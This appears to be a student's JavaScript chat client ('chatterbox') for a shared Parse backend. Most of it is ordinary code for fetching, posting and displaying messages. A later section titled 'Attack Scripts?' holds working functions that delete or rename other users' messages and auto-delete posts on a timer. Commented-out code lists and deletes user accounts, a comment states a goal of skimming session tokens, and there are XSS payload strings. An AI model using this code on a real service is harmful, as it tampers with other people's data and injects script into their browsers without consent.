// YOUR CODE HERE:
var App = function(){
  this.server = "https://api.parse.com/1/classes/chatterbox";
  this.messages = [];
  this.rooms = {};
  this.friends = {};
};

App.prototype.init = function(){
  var self = this;
  this.fetch(function(data){
    roomKey = {};
    self.messages = data.results;
    
    _.each( data.results,
      function(msg){
        self.addMessage(msg);
        roomKey[msg.roomname] = roomKey[msg.roomname] || [];
        roomKey[msg.roomname].push(msg);
    });

    self.rooms = roomKey;

    _.each(self.rooms,function(val,key){
      self.addRoom(key);
    });
  });
};

App.prototype.send = function(message, _successCallBack) {
  return $.ajax({
    url: 'https://api.parse.com/1/classes/chatterbox',
    type: 'POST',
    data: JSON.stringify(message),
    contentType: 'application/json',
    success: function (data) {
      if(_successCallBack){
        _successCallBack(data);
      }
      console.log('chatterbox: Message sent');
    },
    error: function (data) {
      console.error('chatterbox: Failed to send message');
    }
  });
};

App.prototype.fetch = function(_successCallBack) {
  return $.ajax({
    url: 'https://api.parse.com/1/classes/chatterbox',
    type: 'GET',
    data: {'order': '-updatedAt'},
    contentType: 'application/json',
    success: function (data) {
      if(_successCallBack){
        _successCallBack(data);
      }
      return data;
    },
    error: function (data) {
      console.error('chatterbox: Failed to fetch messages');
    }
  });
};

App.prototype.clearMessages = function(){
  $('#chats').children().remove();
};

App.prototype.addMessage = function(message) {
  var time = new Date(message.createdAt);
  var h = time.getHours();
  var m = time.getMinutes();

  $('#chats').append($('<div class="message"></div>'))
  .append($('<a href="#" class="user-name"></a>').text(message.username))
  .append($('<time></time>').attr('datetime', message.createdAt).text(h + ':' + m + (h < 12 ? ' AM' : ' PM')))
  .append($('<p></p>').text(message.text));
};

App.prototype.addRoom = function(roomname) {
  $('#roomSelect').append($('<option></option>').text(roomname));
};

App.prototype.addFriend = function(event) {
  event.preventDefault();
  var friend = $(this).text();
  if (!app.friends[friend]) {
    $('#friendSelect').append($('<option></option>').text($(this).text()));
    app.friends[friend] = true;
  }
};

App.prototype.getUsername = function(){
  return $.ajax({
    url: 'https://api.parse.com/1/users/me',
    type: 'GET',
    data: '',
    contentType: 'application/json',
    success: function (data) {
      console.log('chatterbox: Message sent');
    },
    error: function (data) {
      console.error('chatterbox: Failed to send message');
    }
  });
};

var app = new App();
app.init();
setInterval(deleteDirtyPost, 15000);

$(document).on('click', '#submitMsg', function(event){
  event.preventDefault();
  var message = {
    username: 'fsociety',
    text: $('#chatBox').val(),
    roomname: 'hr38'
  };

  app.send(message, function(){
     $('#chatBox').val("");
  });
  app.clearMessages();
  app.init();
});

$(document).on('click', 'a.user-name', app.addFriend);

/////////////////////////////////////////////////////////////////////
//Attack Scripts?                                                  //
/////////////////////////////////////////////////////////////////////

var ajaxMessageList = function(){
  return $.ajax({
    url: 'https://api.parse.com/1/users',
    type: 'GET',
    data: '',
    contentType: 'application/json',
    success: function (data) {
      console.log('chatterbox: Message sent');
    },
    error: function (data) {
      console.error('chatterbox: Failed to send message');
    }
  });
};

var ajaxUserUpdate = function(message){
  $.ajax({
    url: 'https://api.parse.com/1/classes/chatterbox/' + message.objectId,
    type: 'PUT',
    data: message,
    success: function (data) {
      console.log('chatterbox: renamed message ID: '+ message.objectId);
    },
    error: function (data) {
      console.error('chatterbox: Failed to updateMessage');
    }
  });
};

var assignNewName= function (message, newName){
  message.username = newName;
  return message;
};

var ajaxMsgDelete = function(message){
  $.ajax({
    url: 'https://api.parse.com/1/classes/chatterbox/'+message.objectId,
    type: 'DELETE',
    success: function (data) {
      console.log('chatterbox: deleted msg ID: '+ message.objectId);
    },
    error: function (data) {
      console.error('chatterbox: Failed to delete Message');
    }
  });
};

var deleteAllUserPosts = function(username){
  app.messages.forEach(
    function(message){
      if(message.username ===username){ 
        ajaxMsgDelete(message);
      }
    }
  );

  app.send({
    username: 'Taser',
    text: "All messages by "+username+ " have been deleted.",
    roomname:'lobby'
  });

};

var deleteUserPost = function(username, customMsg){
  var found = false;
  app.messages.forEach(
    function(message){
      if(message.username ===username && !found){ 
        ajaxMsgDelete(message);
        found = true;
      }
    }
  );

  if (found){
    app.send({
      username: 'Taser',
      text: "The last message by "+username+ " has been deleted.  " + customMsg,
      roomname:'lobby'
    });
  }

};

var deleteDirtyPost = function(){
  var found = false;
  app.messages.forEach(
    function(message){
      if(_.contains(message.text,"dirt") && !found){ 
        ajaxMsgDelete(message);
        found = true;
      }
    }
  );

  if (found){
    app.send({
      username: 'Taser',
      text: "no dirt allowed",
      roomname:'lobby'
    });
  }

};

//////////////// Need to skim session tokens ////////////////////////

// var ajaxUserList = function(){
//   return $.ajax({
//     url: 'https://api.parse.com/1/users',
//     type: 'GET',
//     data: '',
//     contentType: 'application/json',
//     success: function (data) {
//       console.log('chatterbox: Message sent');
//     },
//     error: function (data) {
//       console.error('chatterbox: Failed to send message');
//     }
//   });
// };

// var ajaxUserDelete = function(userID){
//   $.ajax({
//     url: 'https://api.parse.com/1/users/'+userID,
//     type: 'DELETE',
//     success: function (data) {
//       console.log('chatterbox: deleted UserID: '+ userID);
//     },
//     error: function (data) {
//       console.error('chatterbox: Failed to send message');
//     }
//   });
// };



// var attackMsg = function(inputScript){
//   return {
//     roomname: inputScript,
//     text: inputScript,
//     username: inputScript
//   };
// };
// var input= '&lt;script&gt;&#36;(&#39;&#35;chats&#39;).css(&#39;background&#39;,&#39;pink&#39;);&lt;/script&gt;';
// var input2='&lt;script&gt;console.log(&#x27;xss&#x27;);&lt;/script'